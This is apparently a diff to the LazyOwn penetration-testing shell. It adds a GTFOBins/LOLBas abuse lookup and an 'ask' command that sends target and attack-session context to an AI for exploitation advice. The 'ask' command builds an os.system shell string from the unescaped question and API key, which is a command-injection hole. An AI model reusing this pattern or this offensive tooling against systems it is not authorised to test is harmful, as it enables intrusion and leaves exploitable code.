+                        example = str(row.get("Example","")).strip()
+                        if example and example != "nan":
+                            print_msg(f"    {example[:120]}")
+            if os.path.isfile(lolbas_parquet):
+                df2 = pd.read_parquet(lolbas_parquet)
+                mask2 = df2["Binary"].str.lower() == binary
+                hits2 = df2[mask2]
+                if not hits2.empty:
+                    found = True
+                    print_msg(f"LOLBas — {binary}")
+                    for _, row in hits2.iterrows():
+                        print_msg(f"  [{row.get('Function Name','')}] {row.get('Description','')[:80]}")
+                        example = str(row.get("Example","")).strip()
+                        if example and example != "nan":
+                            print_msg(f"    {example[:120]}")
+        except ImportError:
+            print_error("pandas required for gtfo: pip install pandas pyarrow")
+            return
+        if not found:
+            print_warn(f"'{binary}' not found in GTFOBins or LOLBas.")
+            print_msg("Check online: https://gtfobins.github.io/")
+
+    @cmd2.with_category(ai_category)
+    def do_ask(self, line):
+        """Ask the AI a question with current session context pre-loaded.
+
+        Injects rhost, lhost, phase, OS, latest scan summary, and recent
+        commands into the prompt so the AI can give targeted advice without
+        you having to copy-paste context manually.
+
+        Requires api_key to be set (assign api_key <groq-key>).
+
+        Usage:
+            ``ask what are the best privesc paths for this Linux host?``
+            ``ask what services look exploitable on this target?``
+            ``ask how do I exploit SMB signing disabled?``
+        """
+        question = (line or "").strip()
+        if not question:
+            print_error("Usage: ask <question>")
+            return
+        api_key = self.params.get("api_key") or ""
+        if not api_key:
+            print_error("api_key not set. Get a free key at https://console.groq.com then: assign api_key <key>")
+            return
+        import json as _json
+        rhost  = self.params.get("rhost") or "unknown"
+        lhost  = self.params.get("lhost") or "unknown"
+        os_id  = str(self.params.get("os_id", "?"))
+        os_label = {"1": "Linux", "2": "Windows"}.get(os_id, "unknown")
+        domain = self.params.get("domain") or "none"
+        world  = {}
+        wm_path = f"{self.path}/sessions/world_model.json"
+        if os.path.isfile(wm_path):
+            try:
+                with open(wm_path) as fh:
+                    world = _json.load(fh)
+            except Exception:
+                pass
+        phase = (world.get("phase") or world.get("current_phase") or "unknown").upper()
+        hosts = list(world.get("hosts", {}).keys())
+        vulns = world.get("vulnerabilities") or []
+        import csv as _csv
+        recent_cmds: list[str] = []
+        csv_path = f"{self.path}/sessions/LazyOwn_session_report.csv"
+        if os.path.isfile(csv_path):
+            try:
+                with open(csv_path, newline="", encoding="utf-8", errors="ignore") as fh:
+                    rows = list(_csv.DictReader(fh))
+                col = next((c for c in ("tool", "command", "name") if rows and c in rows[0]), None)
+                if col:
+                    recent_cmds = [r[col] for r in rows[-5:] if r.get(col)]
+            except Exception:
+                pass
+        context = (
+            f"Target: {rhost} | Attacker: {lhost} | Domain: {domain} | OS: {os_label} | Phase: {phase}\n"
+            f"Known hosts: {', '.join(hosts) or 'none'}\n"
+            f"Vulnerabilities found: {len(vulns)}\n"
+            f"Recent commands: {', '.join(recent_cmds) or 'none'}\n"
+        )
+        full_prompt = f"Session context:\n{context}\n\nOperator question: {question}"
+        print_msg(f"Asking AI with session context ({len(recent_cmds)} recent commands)...")
+        os.system(f'export GROQ_API_KEY="{api_key}" && python3 {self.path}/modules/lazygptcli2.py --prompt \'{full_prompt}\'')
 
     @cmd2.with_category(scanning_category)
     def do_netview(self, line):
@@ -26165,7 +26814,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.download_file_from_c2(line)
         return
 
-    @cmd2.with_category(reporting_category)
+    @cmd2.with_category(ai_category)
     def do_groq(self, line):
         """
         Execute a command to interact with the GROQ API using the provided API key.
@@ -26871,7 +27520,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             self.poutput(f"Critical error: {str(e)}")
 
-    @cmd2.with_category(post_exploitation_category)
+    @cmd2.with_category(ai_category)
     def do_ai_playbook(self, line):
         """
         Generates an offensive playbook using:
